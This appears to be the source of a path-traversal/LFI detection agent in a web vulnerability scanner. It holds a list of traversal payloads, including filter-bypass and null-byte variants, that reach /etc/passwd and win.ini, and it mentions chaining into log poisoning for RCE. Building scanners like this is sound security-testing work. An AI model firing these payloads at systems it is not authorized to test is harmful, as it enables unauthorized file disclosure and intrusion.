"""LFI agent: path traversal and file inclusion probes against well-known,
harmless-to-read files (/etc/passwd, windows/win.ini), confirmed by a known
content signature. Reading a file isn't destructive, so this runs by
default; log poisoning (chaining LFI into RCE via a poisoned log file) is
out of scope for this pass -- it needs the RCE agent's canary logic chained
after a confirmed traversal, which is a natural Phase 5+ extension.
"""
from __future__ import annotations

from noctis.agents.base_agent import AgentResult
from noctis.agents.http_agent import HttpAgent
from noctis.agents.targeting import apply_payload

LFI_PROBES: list[tuple[str, str]] = [
    ("../../../../../../etc/passwd", "root:"),
    ("....//....//....//....//....//....//etc/passwd", "root:"),
    ("/etc/passwd", "root:"),
    ("../../../../../../etc/passwd%00", "root:"),
    ("..\\..\\..\\..\\..\\..\\windows\\win.ini", "[fonts]"),
    ("../../../../../../windows/win.ini", "[fonts]"),
    ("....\\\\....\\\\....\\\\....\\\\windows\\win.ini", "[fonts]"),
]


class LFIAgent(HttpAgent):
    agent_type = "lfi"

    async def run(self) -> AgentResult:
        if self.target is None or not self.target.param_names:
            return self.no_target_result()

        for param in self.target.param_names:
            for payload, signature in LFI_PROBES:
                url, body = apply_payload(self.target, param, payload)
                try:
                    response = await self.client.request(self.target.method, url, data=body)
                except Exception:
                    continue
                if signature in response.text:
                    async def recheck(u=url, b=body, sig=signature) -> bool:
                        r = await self.client.request(self.target.method, u, data=b)
                        return sig in r.text

                    self._recheck = recheck
                    return AgentResult(
                        found=True,
                        payload=payload,
                        request=self._format_request(self.target.method, url, body),
                        response=self._format_response(response),
                        evidence=f"path traversal on param '{param}' returned a file containing '{signature}'",
                    )

        return AgentResult(found=False, notes=f"no LFI confirmed across {len(self.target.param_names)} param(s)")
